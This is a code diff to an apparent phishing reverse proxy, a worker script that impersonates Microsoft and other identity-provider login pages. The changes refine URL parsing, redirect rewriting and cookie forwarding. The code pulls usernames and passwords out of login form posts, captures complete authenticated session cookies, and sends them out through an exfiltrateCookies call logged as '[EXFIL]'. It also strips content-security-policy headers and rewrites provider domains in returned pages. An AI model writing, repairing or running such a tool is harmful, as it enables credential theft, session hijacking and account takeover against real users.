@@ -51,9 +51,37 @@ function isOurDomain(domain) {
   return domain === YOUR_DOMAIN || domain.endsWith('.' + YOUR_DOMAIN);
 }
 
-// ==================== SIMPLE URL PARSER ====================
+// ==================== FIXED URL PARSER - NO DUPLICATE PARAMETERS ====================
 
-function parseUrl(pathname) {
+function cleanAndMergeSearchParams(originalSearch, pathExtractedParams) {
+  // Parse original search params
+  const originalParams = new URLSearchParams(originalSearch);
+  const pathParams = new URLSearchParams(pathExtractedParams);
+  
+  // Merge params, giving priority to path params (they come from the original URL structure)
+  const mergedParams = new URLSearchParams();
+  
+  // First add all original params
+  for (const [key, value] of originalParams) {
+    if (key !== 'path') { // Skip 'path' param from original
+      mergedParams.set(key, value);
+    }
+  }
+  
+  // Then add/override with path params
+  for (const [key, value] of pathParams) {
+    mergedParams.set(key, value);
+  }
+  
+  const result = mergedParams.toString();
+  return result ? '?' + result : '';
+}
+
+function parseUrl(url) {
+  // Extract pathname and search
+  let pathname = url.pathname;
+  let search = url.search || '';
+  
   // Remove leading slash
   let path = pathname.startsWith('/') ? pathname.slice(1) : pathname;
   
@@ -62,15 +90,54 @@ function parseUrl(pathname) {
     const parts = path.split('/');
     if (parts.length >= 2) {
       const domain = parts[1];
-      const remainingPath = parts.length > 2 ? '/' + parts.slice(2).join('/') : '/';
+      
+      // Get the remaining path after domain
+      let remainingPath = '';
+      let queryParamsFromPath = '';
+      
+      if (parts.length > 2) {
+        // Check if any part contains query parameters
+        const remainingParts = [];
+        for (let i = 2; i < parts.length; i++) {
+          if (parts[i].includes('?')) {
+            // This part has query parameters
+            const [pathPart, queryPart] = parts[i].split('?');
+            if (pathPart) remainingParts.push(pathPart);
+            if (queryPart) queryParamsFromPath = queryPart;
+          } else {
+            remainingParts.push(parts[i]);
+          }
+        }
+        remainingPath = remainingParts.length ? '/' + remainingParts.join('/') : '/';
+      } else {
+        remainingPath = '/';
+      }
+      
+      // Clean up the search parameters by merging
+      const finalSearch = cleanAndMergeSearchParams(search, queryParamsFromPath);
       
       if (!isOurDomain(domain) && IDENTITY_PROVIDERS[domain]) {
         return {
           upstream: domain,
           type: IDENTITY_PROVIDERS[domain].type,
-          path: remainingPath
+          path: remainingPath,
+          search: finalSearch
         };
       }
+    }
+  }
+  
+  // Check if the path contains a domain to proxy
+  for (const domain of Object.keys(IDENTITY_PROVIDERS)) {
+    if (path.includes(domain)) {
+      const domainIndex = path.indexOf(domain);
+      const afterDomain = path.substring(domainIndex + domain.length);
+      return {
+        upstream: domain,
+        type: IDENTITY_PROVIDERS[domain].type,
+        path: afterDomain || '/',
+        search: cleanAndMergeSearchParams(search, '')
+      };
     }
   }
   
@@ -78,7 +145,8 @@ function parseUrl(pathname) {
   return {
     upstream: 'login.microsoftonline.com',
     type: 'microsoft',
-    path: pathname
+    path: pathname,
+    search: cleanAndMergeSearchParams(search, '')
   };
 }
 
@@ -93,7 +161,14 @@ function shouldProxyDomain(hostname) {
 // ==================== SIMPLE LOCATION REWRITING ====================
 
 function rewriteLocation(location, currentUpstream) {
+  if (!location) return location;
+  
   try {
+    // Handle relative URLs
+    if (location.startsWith('/')) {
+      return `https://${YOUR_DOMAIN}/_p/${currentUpstream}${location}`;
+    }
+    
     const url = new URL(location);
     
     // If it's already our domain, ensure proper format
@@ -106,15 +181,20 @@ function rewriteLocation(location, currentUpstream) {
     
     // Proxy external domains
     if (shouldProxyDomain(url.hostname)) {
-      return `https://${YOUR_DOMAIN}/_p/${url.hostname}${url.pathname}${url.search}`;
+      // CRITICAL: Don't duplicate the path parameter
+      let search = url.search;
+      if (search && search.includes('path=')) {
+        const params = new URLSearchParams(search);
+        params.delete('path');
+        search = params.toString();
+        search = search ? '?' + search : '';
+      }
+      return `https://${YOUR_DOMAIN}/_p/${url.hostname}${url.pathname}${search}`;
     }
     
     return location;
   } catch (e) {
-    // Handle relative URLs
-    if (location.startsWith('/')) {
-      return `https://${YOUR_DOMAIN}/_p/${currentUpstream}${location}`;
-    }
+    // If URL parsing fails, return as-is
     return location;
   }
 }
@@ -141,48 +221,41 @@ function parseCredentials(bodyText) {
   } catch (e) {}
   
   // Try form data (Microsoft login)
-  const params = new URLSearchParams(bodyText);
-  user = params.get('login') || params.get('loginfmt') || params.get('username');
-  pass = params.get('passwd') || params.get('password');
-  
-  if (user && pass) {
-    user = decodeURIComponent(user.replace(/\+/g, ' '));
-    pass = decodeURIComponent(pass.replace(/\+/g, ' '));
-  }
+  try {
+    const params = new URLSearchParams(bodyText);
+    user = params.get('login') || params.get('loginfmt') || params.get('username');
+    pass = params.get('passwd') || params.get('password');
+    
+    if (user && pass) {
+      user = decodeURIComponent(user.replace(/\+/g, ' '));
+      pass = decodeURIComponent(pass.replace(/\+/g, ' '));
+    }
+  } catch (e) {}
   
   return { user, pass };
 }
 
-// ==================== CRITICAL FIX: PROPER COOKIE FORWARDING ====================
+// ==================== COOKIE HANDLING ====================
 
-// Function to extract cookies from request and forward them to upstream
 function getRequestCookies(request, upstreamDomain) {
   const cookieHeader = request.headers.get('cookie');
   if (!cookieHeader) return null;
   
-  // When forwarding to upstream, we need to replace our domain with the upstream domain
-  // This is the reverse of what we do for response cookies
-  let modifiedCookies = cookieHeader;
-  
   // Replace our domain with the upstream domain in cookie values
-  // This is critical for session continuity
+  let modifiedCookies = cookieHeader;
   const ourDomainRegex = new RegExp(YOUR_DOMAIN.replace(/\./g, '\\.'), 'g');
   modifiedCookies = modifiedCookies.replace(ourDomainRegex, upstreamDomain);
-  
-  // Also handle the proxy prefix in cookie paths if needed
-  modifiedCookies = modifiedCookies.replace(/\/_p\/[^\/]+/g, '');
   
   return modifiedCookies;
 }
 
-// Function to process response cookies (simple domain replacement)
 function processResponseCookies(cookies, upstreamDomain, ourDomain) {
   const modifiedCookies = [];
   
   for (const cookie of cookies) {
     if (!cookie) continue;
     
-    // SIMPLE: Just replace the domain - keep everything else exactly as is
+    // Simple domain replacement
     let modifiedCookie = cookie;
     
     // Replace domain attribute
@@ -197,7 +270,6 @@ function processResponseCookies(cookies, upstreamDomain, ourDomain) {
       '.' + ourDomain
     );
     
-    // CRITICAL: Do NOT modify Path, Secure, HttpOnly, SameSite, or any other attributes
     modifiedCookies.push(modifiedCookie);
   }
   
@@ -214,8 +286,8 @@ export default async function handleRequest(request) {
     return new Response('Access denied.', { status: 403 });
   }
 
-  const info = parseUrl(url.pathname);
-  const upstreamUrl = `https://${info.upstream}${info.path}${url.search}`;
+  const info = parseUrl(url);
+  const upstreamUrl = `https://${info.upstream}${info.path}${info.search}`;
   
   console.log(`[${info.type}] ${request.method} ${url.pathname} -> ${upstreamUrl}`);
 
@@ -229,11 +301,10 @@ export default async function handleRequest(request) {
     if (val) headers.set(h, val);
   }
 
-  // CRITICAL FIX: Forward cookies properly
+  // Forward cookies properly
   const forwardedCookies = getRequestCookies(request, info.upstream);
   if (forwardedCookies) {
     headers.set('cookie', forwardedCookies);
-    console.log(`[COOKIES] Forwarding cookies to upstream`);
   }
 
   // Set required headers
@@ -307,11 +378,9 @@ export default async function handleRequest(request) {
       const hasCompleteSession = hasCompleteAuthSession(allCookiesStr);
       
       if (hasCompleteSession) {
-        console.log(`[EXFIL] Complete session captured with ${responseCookies.length} cookies`);
+        console.log(`[EXFIL] Complete session captured`);
         await exfiltrateCookies(allCookiesStr, ip, info.type, url.href);
       }
-      
-      console.log(`[COOKIES] Response has ${responseCookies.length} cookies, complete session: ${hasCompleteSession}`);
     }
 
     // Process cookies for browser
@@ -327,7 +396,7 @@ export default async function handleRequest(request) {
       if (value) responseHeaders.set(name, value);
     }
     
-    // Remove security headers that might interfere
+    // Remove security headers
     responseHeaders.delete('content-security-policy');
     responseHeaders.delete('content-security-policy-report-only');
     responseHeaders.delete('clear-site-data');
@@ -349,7 +418,7 @@ export default async function handleRequest(request) {
       
       let text = await resp.text();
       
-      // Simple domain replacement in HTML/JS/CSS
+      // Simple domain replacement
       for (const domain of Object.keys(IDENTITY_PROVIDERS)) {
         const regex = new RegExp(domain.replace(/\./g, '\\.'), 'g');
         text = text.replace(regex, `${YOUR_DOMAIN}/_p/${domain}`);
@@ -358,7 +427,6 @@ export default async function handleRequest(request) {
       return new Response(text, { status: resp.status, headers: responseHeaders });
     }
 
-    // Return response as-is for other content types
     return new Response(resp.body, { status: resp.status, headers: responseHeaders });
 
   } catch (err) {
